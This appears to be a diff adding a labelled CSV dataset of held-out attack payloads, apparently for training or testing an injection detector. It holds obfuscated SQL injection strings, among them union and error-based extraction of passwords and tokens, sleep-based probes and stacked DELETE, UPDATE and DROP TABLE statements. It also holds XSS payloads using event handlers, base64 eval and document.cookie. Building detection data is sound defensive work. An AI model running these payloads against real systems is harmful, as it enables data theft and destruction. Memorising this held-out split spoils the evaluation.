@@ -1,0 +1,1741 @@
+text,label,attack_type,category,generator
+"`+Or email=CHAR(114,111,111,116)-- 	",1,sqli,hex_obf,held_out
+1/**_**/or	1beTweEn/**/0%0aaND+9/*!*/-- -,1,sqli,boolean_blind,held_out
+<details/onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+"<object
+onstart=eval(atob('YWxlcnQoMSk='))><!--comment-->",1,xss,stored,held_out
+"""%20Or/**_**/token=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
+'%0aOr SLeep(7)	-- 	,1,sqli,time_blind,held_out
+';%0adEleTE from/**/sessions	-- -,1,sqli,stacked,held_out
+' onstart=window['ale'+'rt']`1` ',1,xss,attribute,held_out
+<video%20onbegin=%28alert%29%281%29>,1,xss,reflected,held_out
+"%27/**_**/anD/*!*/extractvalue(1,concat(0x7e,(select/**_**/pwd/**/from	clients/**/limit/*!*/1)))#",1,sqli,error,held_out
+"data:text/html,<svg onerror=window['ale'+'rt']`1`>",1,xss,dom,held_out
+#<audio onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+"`%20Union	alL/**_**/sEleCt/**/0x78,NULL+FrOm	clients%20%2d%2d ",1,sqli,union,held_out
+');/**_**/upDaTE/**_**/clients/*!*/sEt%09email=1%09#,1,sqli,stacked,held_out
+%27;/**/wAitfoR%0aDElay/**_**/'0:0:8'/*!*/-- ,1,sqli,time_blind,held_out
+')/**/OR/**_**/id=0x73656c656374#,1,sqli,hex_obf,held_out
+1%20or/*!*/6=4+%2d%2d ,1,sqli,boolean_blind,held_out
+"1/**/UNIOn%0aalL SelEct/*!*/0x78,CHAR(120)%09fRom/**/members #",1,sqli,union,held_out
+'+or%0a'a'LiKE'b'%20-- 	,1,sqli,boolean_blind,held_out
+'%20onload=alert(1)%20',1,xss,attribute,held_out
+'%20ontoggle=eval(atob('YWxlcnQoMSk='))%20',1,xss,attribute,held_out
+'/onerror=(alert)(1)/',1,xss,attribute,held_out
+"` ANd	(select/*!*/count(*)%0afrom/**/tokens%20group/*!*/by	concat((select+token%09from%0aclients%09limit%091),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
+"""%09or%09pwd=CHAR(114,111,111,116)/*z*/",1,sqli,hex_obf,held_out
+'-window['ale'+'rt']`1`-',1,xss,attribute,held_out
+"`%09AnD updatexml(1,concat(0x7e,(select%20role	from	clients%20limit+1)),1)-- 	",1,sqli,error,held_out
+"1%20UNiOn%0aalL%09seLECt+NULL,password,NULL frOm%0aadmins/**_**/#",1,sqli,union,held_out
+"1%20Union+All%0asElEct/*!*/CHAR(120),0x78,NULL%20FRoM sessions #",1,sqli,union,held_out
+"""/**_**/anD/**_**/extractvalue(1,concat(0x7e,(select%09hash from+members%20limit%0a1)))-- ",1,sqli,error,held_out
+"`%20aND%09updatexml(1,concat(0x7e,(select name/*!*/from staff/**/limit+1)),1)-- 	",1,sqli,error,held_out
+<img%20onanimationstart=print()><!--stored-->,1,xss,stored,held_out
+"data:text/html,<body onbegin=alert(1)>",1,xss,dom,held_out
+<iframe%20onpointerover=alert%28String.fromCharCode%2888%2C83%2C83%29%29>,1,xss,reflected,held_out
+"`%0aAnD+(select count(*)/**/from/**_**/staff/**_**/group by/*!*/concat((select%0apassword%20from%20clients%09limit	1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+"1	ANd/**_**/extractvalue(1,concat(0x7e,(select%0apwd%20from%20users limit/**/1)))-- ",1,sqli,error,held_out
+"""%09ontoggle=top['al'+'ert'](1)%09x=""",1,xss,attribute,held_out
+"""/**_**/OR/**_**/hash=0x756e696f6e-- -",1,sqli,hex_obf,held_out
+%27	And/**/(SELECT+1+FRoM/**_**/(SELECT(sLEeP(3)))x)-- 	,1,sqli,time_blind,held_out
+"""><iframe onload=window['ale'+'rt']`1`>",1,xss,attribute,held_out
+`/**_**/Or%206betWeeN+0/*!*/And+9/*!*/-- -,1,sqli,boolean_blind,held_out
+%27;%09updAtE/*!*/members+Set+name=1%09#,1,sqli,stacked,held_out
+"""%09anD extractvalue(1,concat(0x7e,(select	id from/**/sessions/**_**/limit/**_**/1)))#",1,sqli,error,held_out
+"<details
+onanimationstart=eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29>",1,xss,reflected,held_out
+`;/**/UpDAtE%20accounts%0aSeT+id=1%20/*z*/,1,sqli,stacked,held_out
+`;%0aWaiTfOR/**/dELAY	'0:0:8'%20#,1,sqli,time_blind,held_out
+`/*!*/oR%20balance=0x70617373776f7264-- 	,1,sqli,hex_obf,held_out
+"'%09aND+(select+count(*)+from%20products group+by%20concat((select	password from+orders%0alimit%201),floor(rand(0)*2)))-- 	",1,sqli,error,held_out
+"""+UnION%09aLl%09sELECt/**_**/role,0x78,pwd%0aFrOm+staff+/*z*/",1,sqli,union,held_out
+' ontoggle=(alert)(1) ',1,xss,attribute,held_out
+"data:text/html,<audio onstart=alert(document.cookie)>",1,xss,dom,held_out
+"<input
+onstart=print()>",1,xss,reflected,held_out
+"')/**_**/AND/*!*/updatexml(1,concat(0x7e,(select/**_**/balance/**/from%0aadmins%09limit%091)),1)%2d%2d ",1,sqli,error,held_out
+<math	onerror=alert(document.cookie)><!--comment-->,1,xss,stored,held_out
+"%27%09ANd/**_**/extractvalue(1,concat(0x7e,(select/**/role/**_**/from%20admins limit	1)))%2d%2d ",1,sqli,error,held_out
+') OR+6=7+%2d%2d ,1,sqli,boolean_blind,held_out
+'	Or	role=0x61646d696e#,1,sqli,hex_obf,held_out
+<details onfocus=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
+"""/*!*/aNd+(select/**/count(*) from/**_**/tokens%20group%0aby concat((select%09pwd+from+products limit	1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+"""><marquee onstart=print()>",1,xss,attribute,held_out
+"')/**/oR+email=CHAR(117,110,105,111,110)-- 	",1,sqli,hex_obf,held_out
+javascript:alert(document.cookie),1,xss,dom,held_out
+<object	onpointerover=%28alert%29%281%29>,1,xss,reflected,held_out
+#<svg onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+<math	onpointerover=window['ale'+'rt']`1`><!--stored-->,1,xss,stored,held_out
+<svg/onbegin=alert(document.cookie)>,1,xss,reflected,held_out
+';+DeLeTE/**/FrOm%09accounts%09-- ,1,sqli,stacked,held_out
+<audio/ontoggle=(alert)(1)><!--stored-->,1,xss,stored,held_out
+#<form onstart=window['ale'+'rt']`1`>,1,xss,dom,held_out
+'/*!*/oR/**_**/5=8	-- 	,1,sqli,boolean_blind,held_out
+"')/**_**/unioN aLL	SeleCT	token,balance/**_**/FrOM orders/*!*/-- 	",1,sqli,union,held_out
+"""/**/or 0x61=0x61%0a-- 	",1,sqli,boolean_blind,held_out
+"""+or%0atoken=0x73656c656374/*z*/",1,sqli,hex_obf,held_out
+%27/*!*/anD	(SELECT+1 fROM/*!*/(SELECT(SLEEp(3)))x)-- ,1,sqli,time_blind,held_out
+"""><input onpointerover=(alert)(1)>",1,xss,attribute,held_out
+<details onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+javascript:eval(atob('YWxlcnQoMSk=')),1,xss,dom,held_out
+<iframe%09onpointerover=alert%28document.cookie%29>,1,xss,reflected,held_out
+<input/onbegin=alert(document.cookie)><!--post-->,1,xss,stored,held_out
+"""/**/OR/**/'a'LiKE'b'/**_**/%2d%2d ",1,sqli,boolean_blind,held_out
+"""><body onanimationstart=alert(document.cookie)>",1,xss,attribute,held_out
+"""/onbegin=eval(atob('YWxlcnQoMSk='))/x=""",1,xss,attribute,held_out
+<marquee%20onpointerover=top['al'+'ert'](1)>,1,xss,reflected,held_out
+"data:text/html,<input onpointerover=(alert)(1)>",1,xss,dom,held_out
+<object/onerror=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
+1/*!*/oR/*!*/balance=0x61646d696e-- 	,1,sqli,hex_obf,held_out
+<form%09ontoggle=alert(1)>,1,xss,reflected,held_out
+`/**_**/or%0a0x61=0x61	/*z*/,1,sqli,boolean_blind,held_out
+<objectonload=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
+%27;/*!*/INseRt iNtO	tokens+vaLuES(1)/**_**/-- -,1,sqli,stacked,held_out
+"data:text/html,<svg ontoggle=alert(document.cookie)>",1,xss,dom,held_out
+"""/*!*/OR/**/1bETween+0%0aAnd%099/*!*/%2d%2d ",1,sqli,boolean_blind,held_out
+"""	Or%09balance=0x726f6f74-- 	",1,sqli,hex_obf,held_out
+#<iframe onbegin=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+"%27%20anD%20updatexml(1,concat(0x7e,(select id%0afrom	sessions%09limit/**_**/1)),1)%2d%2d ",1,sqli,error,held_out
+"""/*!*/OR/**_**/token=CHAR(114,111,111,116)-- ",1,sqli,hex_obf,held_out
+`/**/Or/**/email=0x73656c656374-- ,1,sqli,hex_obf,held_out
+"` anD (select count(*)+from/**_**/orders	group/**/by/**_**/concat((select/**/password/**/from%09admins+limit 1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+<body/onpointerover=print()><!--stored-->,1,xss,stored,held_out
+"""%09AND+extractvalue(1,concat(0x7e,(select%0apassword%20from/**_**/admins	limit/**_**/1)))%2d%2d ",1,sqli,error,held_out
+"""><marquee onerror=alert(1)>",1,xss,attribute,held_out
+%27/**/or+password=0x61646d696e-- ,1,sqli,hex_obf,held_out
+"`%0aaND/**_**/updatexml(1,concat(0x7e,(select/**/role%20from+accounts/**/limit+1)),1)/*z*/",1,sqli,error,held_out
+';/**/UpdATe%09members%20sEt%0atoken=1/*!*/-- -,1,sqli,stacked,held_out
+""";%0aDelETE%20FRoM%20tokens/**/#",1,sqli,stacked,held_out
+`; UpdaTe	products%20SEt%0apwd=1/**_**/#,1,sqli,stacked,held_out
+<iframe onfocus=alert(document.cookie)>,1,xss,reflected,held_out
+1 anD	(SELECT 1%20FrOm/**_**/(SELECT(sLEep(7)))x)-- -,1,sqli,time_blind,held_out
+"%27/**_**/uNiON%09all%0aSelECT%09NULL,0x78,name,NULL/**/froM/**/products %2d%2d ",1,sqli,union,held_out
+<iframe ontoggle=print()><!--stored-->,1,xss,stored,held_out
+'%0aAND%0a(SELECT%201 frOm/**/(SELECT(SLeEp(6)))x)#,1,sqli,time_blind,held_out
+<svg/ontoggle=alert(1)>,1,xss,reflected,held_out
+"""	Or/**/0x61=0x61/*!*/%2d%2d ",1,sqli,boolean_blind,held_out
+<video%20onpointerover=print()><!--post-->,1,xss,stored,held_out
+`%0aOr ssn=0x73656c656374/*z*/,1,sqli,hex_obf,held_out
+`/*!*/or	token=0x756e696f6e#,1,sqli,hex_obf,held_out
+"%27	uNioN	all/**_**/SElEct/**_**/NULL,email,0x78%20fRoM/*!*/products+-- ",1,sqli,union,held_out
+"data:text/html,<audio onmouseover=window['ale'+'rt']`1`>",1,xss,dom,held_out
+"`	UNioN+ALl/**_**/selEcT/*!*/NULL,CHAR(120),CHAR(120),CHAR(120),pwd%20fROm/**/staff -- -",1,sqli,union,held_out
+';	Insert%0aIntO%09admins/*!*/vALues(1)+%2d%2d ,1,sqli,stacked,held_out
+1;	WAiTFoR DElay+'0:0:4'%20#,1,sqli,time_blind,held_out
+"""	and	extractvalue(1,concat(0x7e,(select/**/email%09from%20users/**/limit+1)))-- ",1,sqli,error,held_out
+'%0aoR%09password=0x73656c656374-- -,1,sqli,hex_obf,held_out
+1;%20WaItfOr%09DELAY/*!*/'0:0:7'%20-- -,1,sqli,time_blind,held_out
+1/**/oR/*!*/7betwEEn%200/**_**/aNd/**/9%20#,1,sqli,boolean_blind,held_out
+<videoonstart=(alert)(1)>,1,xss,reflected,held_out
+';/**/WaItfoR/**/DELAy/**_**/'0:0:3'%20-- 	,1,sqli,time_blind,held_out
+"#<math onstart=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
+<form%09onanimationstart=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
+<iframe%20onanimationstart=print()><!--comment-->,1,xss,stored,held_out
+"""%0aOR/**/SlEeP(7)/**_**/-- 	",1,sqli,time_blind,held_out
+';/*!*/iNsErt/**/intO%0aclients vALues(1)/*!*/-- 	,1,sqli,stacked,held_out
+"""%20AND	(select	count(*)	from%09products	group/**_**/by%20concat((select/**/pwd from/**_**/orders%09limit%091),floor(rand(0)*2)))-- ",1,sqli,error,held_out
+#<math onstart=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+"' onload=alert(String.fromCharCode(88,83,83)) '",1,xss,attribute,held_out
+%27/**_**/And+(SELECT+1/*!*/FrOM%09(SELECT(SLEep(3)))x)-- -,1,sqli,time_blind,held_out
+'%0aOR/**/8=8	#,1,sqli,boolean_blind,held_out
+""" ontoggle=(alert)(1) x=""",1,xss,attribute,held_out
+';/*!*/WaiTfOR+DElaY+'0:0:9'	-- ,1,sqli,time_blind,held_out
+'/**_**/OR/**_**/0x61=0x61%0a-- ,1,sqli,boolean_blind,held_out
+1/**_**/OR+pwd=0x756e696f6e#,1,sqli,hex_obf,held_out
+1+Or/*!*/0x61=0x61%09%2d%2d ,1,sqli,boolean_blind,held_out
+"')+oR/**/ssn=CHAR(117,110,105,111,110)/*z*/",1,sqli,hex_obf,held_out
+"data:text/html,<svg ontoggle=alert(1)>",1,xss,dom,held_out
+<img	onerror=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
+"`%20AND/**_**/extractvalue(1,concat(0x7e,(select/**_**/balance	from+sessions%09limit	1)))-- ",1,sqli,error,held_out
+"""><details onmouseover=alert(1)>",1,xss,attribute,held_out
+<math	onstart=alert(document.cookie)><!--comment-->,1,xss,stored,held_out
+<bodyonpointerover=alert(1)><!--post-->,1,xss,stored,held_out
+<video%09onstart=window['ale'+'rt']`1`><!--post-->,1,xss,stored,held_out
+"""%09unIoN/**_**/ALL%0aSELecT%0aNULL,CHAR(120)/**/FROm/**/members/**/-- ",1,sqli,union,held_out
+"""%0aUnion/*!*/all%09SElECT id,name,id/*!*/from/**_**/staff %2d%2d ",1,sqli,union,held_out
+""";%0aWaiTFOR/*!*/deLAy%20'0:0:6'%20-- -",1,sqli,time_blind,held_out
+<input/onload=top['al'+'ert'](1)>,1,xss,reflected,held_out
+<input/onfocus=print()>,1,xss,reflected,held_out
+"data:text/html,<img onmouseover=alert(1)>",1,xss,dom,held_out
+<iframe/onfocus=alert(document.cookie)><!--post-->,1,xss,stored,held_out
+"""/**_**/or%20token=CHAR(115,101,108,101,99,116)-- -",1,sqli,hex_obf,held_out
+<img	onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+`%09or/**/9BETWEEn	0%09And/**_**/9 %2d%2d ,1,sqli,boolean_blind,held_out
+"""%20oR%0a6beTween/**/0/*!*/And	9	/*z*/",1,sqli,boolean_blind,held_out
+%27;/*!*/uPdAtE/**_**/members%09SeT%20password=1 %2d%2d ,1,sqli,stacked,held_out
+"<video
+onmouseover=top['al'+'ert'](1)><!--stored-->",1,xss,stored,held_out
+<input onmouseover=window['ale'+'rt']`1`><!--stored-->,1,xss,stored,held_out
+<imgonpointerover=alert(1)><!--comment-->,1,xss,stored,held_out
+'+AnD%0a(SELECT+1%09FROM%20(SELECT(sleeP(7)))x)/*z*/,1,sqli,time_blind,held_out
+"')/**/Or	token=CHAR(97,100,109,105,110)/*z*/",1,sqli,hex_obf,held_out
+';%0aWAiTfOr+DeLay+'0:0:6'%20-- 	,1,sqli,time_blind,held_out
+"""	onmouseover=alert(1)	x=""",1,xss,attribute,held_out
+'/onmouseover=alert(1)/',1,xss,attribute,held_out
+%27/**_**/OR%200x61=0x61%20-- -,1,sqli,boolean_blind,held_out
+<video onerror=print()>,1,xss,reflected,held_out
+<math/onfocus=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
+"""/**/or+0x61=0x61/*!*/%2d%2d ",1,sqli,boolean_blind,held_out
+<svg/onbegin=window['ale'+'rt']`1`>,1,xss,reflected,held_out
+"1%0aAND (select	count(*)/**/from+accounts+group%20by/**/concat((select%09balance%20from%20staff limit/**/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
+"%27%20ANd%09extractvalue(1,concat(0x7e,(select/**/token	from%09admins%0alimit/**/1)))-- ",1,sqli,error,held_out
+"""/onpointerover=window['ale'+'rt']`1`/x=""",1,xss,attribute,held_out
+');/**_**/UPdATe users%09sET%0apassword=1/**/-- ,1,sqli,stacked,held_out
+"')/**/uniON%0aAll/**_**/seLecT%20CHAR(120),CHAR(120)%20frOm	members%0a-- -",1,sqli,union,held_out
+<input/onload=(alert)(1)><!--stored-->,1,xss,stored,held_out
+%27;	iNSeRT+iNTo/**_**/tokens/**/vaLuEs(1)/**/-- 	,1,sqli,stacked,held_out
+"%27/*!*/unioN/*!*/alL	selECt%09NULL,0x78,CHAR(120),hash+FRoM%09accounts	-- -",1,sqli,union,held_out
+<iframe%20onfocus=alert%28document.cookie%29>,1,xss,reflected,held_out
+"%27%09uNIOn%20ALl+sEleCt+NULL,0x78,id,ssn,balance%20FROm products	#",1,sqli,union,held_out
+`/**_**/Or/*!*/token=0x61646d696e%2d%2d ,1,sqli,hex_obf,held_out
+%27	oR%0abalance=0x73656c656374-- ,1,sqli,hex_obf,held_out
+'%0aoR%20SLeEp(3)+-- 	,1,sqli,time_blind,held_out
+<svg/onanimationstart=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+#<body onload=(alert)(1)>,1,xss,dom,held_out
+"""/*!*/oR	ssn=0x70617373776f7264-- 	",1,sqli,hex_obf,held_out
+"`/**/UNiON+AlL	SEleCT	NULL,0x78,CHAR(120)+fROM clients #",1,sqli,union,held_out
+#<input onpointerover=alert(1)>,1,xss,dom,held_out
+"""><body onmouseover=alert(document.cookie)>",1,xss,attribute,held_out
+#<form onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+<svg/onbegin=print()>,1,xss,reflected,held_out
+1	Or/*!*/4=7 -- 	,1,sqli,boolean_blind,held_out
+"'
+onpointerover=print()
+'",1,xss,attribute,held_out
+1;+dROp/*!*/tabLe/*!*/sessions/*!*/#,1,sqli,stacked,held_out
+""" UnIon%0aAll/**_**/SELECt%09NULL,CHAR(120)+FrOm	orders/**/%2d%2d ",1,sqli,union,held_out
+';	uPdAtE%20sessions/*!*/Set/**/role=1%09%2d%2d ,1,sqli,stacked,held_out
+<iframe%20onanimationstart=alert(1)><!--post-->,1,xss,stored,held_out
+"#"";alert(String.fromCharCode(88,83,83));//",1,xss,dom,held_out
+"""><img onmouseover=window['ale'+'rt']`1`>",1,xss,attribute,held_out
+"1+UnioN/*!*/AlL/**/SElect+CHAR(120),NULL,NULL,CHAR(120),NULL+fROm%0aaccounts/**_**/%2d%2d ",1,sqli,union,held_out
+"')+unioN%09aLl%0asELect/*!*/ssn,password,0x78%0aFrom%20clients/*!*//*z*/",1,sqli,union,held_out
+%27/**/Or+email=0x726f6f74-- 	,1,sqli,hex_obf,held_out
+""";+DElEtE FroM	members/**_**/%2d%2d ",1,sqli,stacked,held_out
+"'%09uNIOn	aLl/*!*/SelEcT+ssn,NULL,CHAR(120)%20FRoM%0aproducts	-- -",1,sqli,union,held_out
+1/**_**/Or+name=0x73656c656374-- -,1,sqli,hex_obf,held_out
+<details%20onerror=(alert)(1)><!--comment-->,1,xss,stored,held_out
+%27; waiTfor/*!*/dElAy%0a'0:0:3'%20-- ,1,sqli,time_blind,held_out
+"""	aND+(SELECT/**/1+fRom	(SELECT(SLEep(4)))x)%2d%2d ",1,sqli,time_blind,held_out
+"1 union/*!*/all%20SElECT%20password,CHAR(120),CHAR(120),CHAR(120)/**_**/fROM%20accounts/*!*//*z*/",1,sqli,union,held_out
+"')	oR%0apwd=CHAR(97,100,109,105,110)-- -",1,sqli,hex_obf,held_out
+<audio/onfocus=top['al'+'ert'](1)>,1,xss,reflected,held_out
+#<marquee onbegin=window['ale'+'rt']`1`>,1,xss,dom,held_out
+%27%0aOr SLeeP(6)	-- ,1,sqli,time_blind,held_out
+"data:text/html,<input onerror=alert(document.cookie)>",1,xss,dom,held_out
+')/*!*/or+token=0x726f6f74-- ,1,sqli,hex_obf,held_out
+"1/**_**/aNd%09extractvalue(1,concat(0x7e,(select%20pwd	from/**_**/admins/**/limit%091)))-- 	",1,sqli,error,held_out
+<audio%20onanimationstart=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
+1;%0adRop	TabLe	clients+#,1,sqli,stacked,held_out
+"""%0aAND%20updatexml(1,concat(0x7e,(select/*!*/balance	from clients%20limit%201)),1)-- ",1,sqli,error,held_out
+%27; Insert+into%0atokens/**/VAluEs(1)/**_**/-- ,1,sqli,stacked,held_out
+#<details onbegin=(alert)(1)>,1,xss,dom,held_out
+"""ontoggle=alert(document.cookie)x=""",1,xss,attribute,held_out
+"<marquee
+onmouseover=eval(atob('YWxlcnQoMSk='))><!--stored-->",1,xss,stored,held_out
+`;+UpDATE/**/admins SeT	pwd=1/**/-- ,1,sqli,stacked,held_out
+`/*!*/and%20(SELECT%201/*!*/froM%09(SELECT(SlEeP(7)))x)-- ,1,sqli,time_blind,held_out
+"')%0aaND/**_**/(select%0acount(*)%20from+orders/**/group%20by+concat((select role/**_**/from	accounts limit/**_**/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
+"1 UNion/**/all/*!*/SElECT/**_**/0x78,id,0x78,CHAR(120),role%09FrOM%0aproducts%09/*z*/",1,sqli,union,held_out
+"""+OR/**_**/hash=0x756e696f6e-- -",1,sqli,hex_obf,held_out
+1;/*!*/InSeRt	INtO+accounts+vALuES(1) -- 	,1,sqli,stacked,held_out
+1;%09DELetE%20from%20sessions%0a%2d%2d ,1,sqli,stacked,held_out
+')%0aor+7BeTween/**/0+aND 9+#,1,sqli,boolean_blind,held_out
+<sCrIpT>window['ale'+'rt']`1`</sCrIpT>,1,xss,reflected,held_out
+<img/onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+');/**/DeLeTE/**_**/fRom%20sessions%20#,1,sqli,stacked,held_out
+`%09oR/**/pwd=0x756e696f6e/*z*/,1,sqli,hex_obf,held_out
+""" oR%0a0x61=0x61%09%2d%2d ",1,sqli,boolean_blind,held_out
+"%27 aNd%0a(select%0acount(*)%20from/**_**/products+group%0aby	concat((select%0aname/**/from%0aaccounts%0alimit	1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
+"<iframe
+onbegin=alert(document.cookie)><!--comment-->",1,xss,stored,held_out
+1	oR/**/0x61=0x61/**_**//*z*/,1,sqli,boolean_blind,held_out
+';%09deLETE+fRoM%20admins	-- 	,1,sqli,stacked,held_out
+' onfocus=print() ',1,xss,attribute,held_out
+"')%0aaNd	(select	count(*)	from%0atokens%09group by	concat((select email	from products+limit/*!*/1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+<mathonanimationstart=(alert)(1)><!--comment-->,1,xss,stored,held_out
+<imgonbegin=print()>,1,xss,reflected,held_out
+<svgonpointerover=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
+"""	anD %2528SELECT%201/**/froM+(SELECT(sleEp(5)))x)-- ",1,sqli,time_blind,held_out
+"')%0aUniON	all/*!*/sELECt%09CHAR(120),CHAR(120),0x78,balance,NULL+fRoM staff	-- -",1,sqli,union,held_out
+"""%20or%0aname=CHAR(112,97,115,115,119,111,114,100)#",1,sqli,hex_obf,held_out
+"""/**/UniON+AlL%0aSeLEct/*!*/0x78,NULL,0x78 FrOm/*!*/admins%09%2d%2d ",1,sqli,union,held_out
+')%09Or	role=0x61646d696e-- 	,1,sqli,hex_obf,held_out
+1;/**_**/uPdatE%09products sET	ssn=1	-- -,1,sqli,stacked,held_out
+"1/**_**/aNd/**/updatexml(1,concat(0x7e,(select	ssn	from%20members%0alimit	1)),1)#",1,sqli,error,held_out
+"<body%20ontoggle=alert(String.fromCharCode(88,83,83))><!--post-->",1,xss,stored,held_out
+<math%09onbegin=alert(document.cookie)><!--post-->,1,xss,stored,held_out
+%27	oR/**/0x61=0x61 #,1,sqli,boolean_blind,held_out
+%27;%20waItfOr	DElAy%09'0:0:6'%09-- ,1,sqli,time_blind,held_out
+"""
+onload=alert(String.fromCharCode(88,83,83))
+x=""",1,xss,attribute,held_out
+'/**_**/And/**/(SELECT/*!*/1%0afRoM/*!*/(SELECT(SLeEp(7)))x)-- -,1,sqli,time_blind,held_out
+%27;/**_**/delETe/*!*/frOM%20members/**_**//*z*/,1,sqli,stacked,held_out
+"`%20UnION aLL	sELeCt/**_**/ssn,token,password+FroM accounts/**_**/-- ",1,sqli,union,held_out
+"'ontoggle=alert(String.fromCharCode(88,83,83))'",1,xss,attribute,held_out
+`/*!*/oR%20slEep(6)%0a%2d%2d ,1,sqli,time_blind,held_out
+<audio onload=window['ale'+'rt']`1`><!--post-->,1,xss,stored,held_out
+`/**_**/oR slEep(7)/**_**/%2d%2d ,1,sqli,time_blind,held_out
+"'onstart=alert(String.fromCharCode(88,83,83))'",1,xss,attribute,held_out
+<iframeonbegin=print()>,1,xss,reflected,held_out
+'/**/or/**_**/SleeP(3)/**/-- -,1,sqli,time_blind,held_out
+'+oR	SlEEP(8)%0a-- ,1,sqli,time_blind,held_out
+%27/**/or/**/0x61=0x61/**_**/-- ,1,sqli,boolean_blind,held_out
+'	ANd+(SELECT 1/*!*/FROm/**_**/(SELECT(SlEep(7)))x)%2d%2d ,1,sqli,time_blind,held_out
+<object%20onload=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
+1	oR	balance=0x61646d696e/*z*/,1,sqli,hex_obf,held_out
+"' onbegin=alert(String.fromCharCode(88,83,83)) '",1,xss,attribute,held_out
+1;/*!*/uPDatE%0aadmins/*!*/SeT+balance=1+%2d%2d ,1,sqli,stacked,held_out
+<body%09ontoggle=alert(1)><!--comment-->,1,xss,stored,held_out
+"1/**_**/aND%20(select/**_**/count(*)/**_**/from%20products%20group/**_**/by/**_**/concat((select/*!*/role/*!*/from members/**/limit/**_**/1),floor(rand(0)*2)))#",1,sqli,error,held_out
+"data:text/html,<object onbegin=window['ale'+'rt']`1`>",1,xss,dom,held_out
+"')/**/or/**/balance=CHAR(114,111,111,116)-- -",1,sqli,hex_obf,held_out
+<detailsonerror=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
+#<object onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+#<body onanimationstart=top['al'+'ert'](1)>,1,xss,dom,held_out
+<math%09ontoggle=top['al'+'ert'](1)><!--comment-->,1,xss,stored,held_out
+""";%09WAITFOR%09dELAy/**/'0:0:4'	/*z*/",1,sqli,time_blind,held_out
+"<svg/onbegin=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+"#"";alert(1);//",1,xss,dom,held_out
+`/**/or/*!*/'a'liKe'b'%0a-- 	,1,sqli,boolean_blind,held_out
+"""%0auNION/**_**/ALL/**/SElEcT%200x78,NULL,NULL%0afROm/**_**/accounts+-- -",1,sqli,union,held_out
+#<img onfocus=top['al'+'ert'](1)>,1,xss,dom,held_out
+"<svg
+onpointerover=print()><!--post-->",1,xss,stored,held_out
+';%0adEletE	fROm/**_**/clients%20#,1,sqli,stacked,held_out
+';%09WaItFor	dELaY%09'0:0:3'/**/%2d%2d ,1,sqli,time_blind,held_out
+"'+UnIon/**/all/**_**/SEleCT%09CHAR(120),NULL,CHAR(120),CHAR(120),0x78 fRoM/**_**/users/*!*//*z*/",1,sqli,union,held_out
+#<details onstart=(alert)(1)>,1,xss,dom,held_out
+"""+or sLeEP(3)/**_**/#",1,sqli,time_blind,held_out
+%27;%0awaITfOR/**/DelAY%09'0:0:3'/**/#,1,sqli,time_blind,held_out
+`;+DELete/**_**/froM/**_**/members%0a-- 	,1,sqli,stacked,held_out
+<audio	ontoggle=alert(1)>,1,xss,reflected,held_out
+<audio	onload=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+<img%20onanimationstart=(alert)(1)><!--stored-->,1,xss,stored,held_out
+"#"";print();//",1,xss,dom,held_out
+"'/**_**/AND%20updatexml(1,concat(0x7e,(select/*!*/pwd/**/from%20products%0alimit 1)),1)#",1,sqli,error,held_out
+"`+uNioN%09all+sElECT/**/name,0x78 FRom%0ausers/**_**/#",1,sqli,union,held_out
+"')+ANd	updatexml(1,concat(0x7e,(select%09token%20from	tokens	limit+1)),1)-- ",1,sqli,error,held_out
+"%27 Or	hash=CHAR(115,101,108,101,99,116)-- ",1,sqli,hex_obf,held_out
+<iframe	onpointerover=window%5B%27ale%27%2B%27rt%27%5D%601%60>,1,xss,reflected,held_out
+1	oR%090x61=0x61+#,1,sqli,boolean_blind,held_out
+')/**/OR/*!*/6betweEN/**/0 ANd+9	#,1,sqli,boolean_blind,held_out
+');%0auPdATE%20users/**/seT name=1 -- 	,1,sqli,stacked,held_out
+`;/**/uPDATE%20clients+SEt/**/id=1%20-- 	,1,sqli,stacked,held_out
+"""%0aUNIon+ALL/*!*/SElECT+CHAR(120),NULL,0x78,CHAR(120)/**/FroM+accounts+-- 	",1,sqli,union,held_out
+<video/onmouseover=top['al'+'ert'](1)>,1,xss,reflected,held_out
+';/**_**/insErt+InTO/**/products%0avaLuEs(1)/**_**/-- 	,1,sqli,stacked,held_out
+1;/*!*/DEletE from+clients%09%2d%2d ,1,sqli,stacked,held_out
+<formonbegin=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
+<svg%20onstart=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
+%27;%20WAITfOR	DelAY%09'0:0:9'/**_**/%2d%2d ,1,sqli,time_blind,held_out
